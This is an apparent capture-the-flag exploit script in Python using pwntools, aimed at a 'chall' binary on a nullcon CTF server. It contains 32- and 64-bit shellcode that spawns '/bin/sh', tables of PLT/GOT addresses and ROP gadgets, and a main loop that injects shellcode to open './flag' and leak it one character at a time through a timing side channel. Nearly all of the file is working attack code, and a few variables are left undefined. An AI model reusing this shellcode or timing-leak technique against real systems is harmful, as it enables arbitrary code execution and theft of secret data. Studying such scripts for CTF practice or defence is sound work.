#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './chall'
binary = ELF(program_name)

remote_server = 'pwn4.ctf.nullcon.net'
PORT = 5003

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    caca =1

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        caca = 2

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

ork_PLT = 0x400820
getpagesize_PLT = 0x4007f0
perror_PLT = 0x4007e0
__assert_fail_PLT = 0x4007a0
dup2_PLT = 0x400790
read_PLT = 0x4007b0
mmap_PLT = 0x400780
fclose_PLT = 0x400770
write_PLT = 0x40075c
exit_PLT = 0x400800
fflush_PLT = 0x4007c0
open_PLT = 0x4007d0
wait_PLT = 0x400810

# ============ GOT =========== #

ork_GOT = 0x601078
getpagesize_GOT = 0x601060
__gmon_start___GOT = 0x600ff8
__assert_fail_GOT = 0x601038
stdout_GOT = 0x6010a0
read_GOT = 0x601040
mmap_GOT = 0x601028
stdin_GOT = 0x6010b0
fclose_GOT = 0x601020
write_GOT = 0x601018
exit_GOT = 0x601068
__libc_start_main_GOT = 0x600ff0
stderr_GOT = 0x6010c0
perror_GOT = 0x601058
dup2_GOT = 0x601030
open_GOT = 0x601050
fflush_GOT = 0x601048
wait_GOT = 0x601070

# ============================================================== #
# ====================== GADGETS & MAGIC ======================= #
 # ============================================================== #

pop_rdi = 0x0000000000000bb3 # pop rdi; ret; 
pop_rsi = 0x0000000000000bb1 # pop rsi; pop r15; ret; 
pop_rbp = 0x0000000000000bab # pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000000baf # pop rbp; pop r14; pop r15; ret; 
pop_rbp = 0x0000000000000898 # pop rbp; ret; 
pop_rbp = 0x00000000000008d8 # pop rbp; ret; 
pop_rbp = 0x00000000000008f9 # pop rbp; ret; 
pop_rbp = 0x0000000000000943 # pop rbp; ret; 
pop_rbp = 0x000000000000098c # pop rbp; ret; 
pop_rbp = 0x0000000000000b4d # pop rbp; ret; 

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":
    
    flag = ''
    d1 =  'qwertyuiopasdfghjklzxcvbnm_{}1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
    for i in range(0,40):
        for chrr in d1:
            
            # p = remote(remote_server, PORT)
            p = process(program_name)
            print 'FLAG=',flag,'| TRY=',chrr

            payload = ''
            payload += asm(shellcraft.open('./flag')) # open flag
            payload += asm(shellcraft.read(fd='rax', buffer='rbp', count=0x100)) # read flag in rbp
            payload += asm('mov rcx, '+str(i)) # flag chrr index
            payload += asm('mov rdx, rbp')
            payload += asm('mov rbx, '+str(ord(chrr))) # printables
            payload += asm('''
            mov rax, [rdx+rcx]
            cmp bl, al
            je SUCCESS
            jmp EXIT

            EXIT:
            mov rax, 60 
            mov rdi, 0x0
            syscall

            SUCCESS:
            mov rcx, 0x3ffffff
            sleep:
            loop sleep
            ''')

            p.sendline(payload)

            start_t = time.time()
            print 'START=',start_t
            try:
                p.recvline()
            except EOFError:
                pass
            end_t = time.time()
            print 'END=',end_t
            if end_t - start_t >= 0.08:
                flag += chrr
                break
            p.close()
            # ============ GDB =========== #
            # gdb.attach(p,'''
            # finish
            # ''')

            # p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
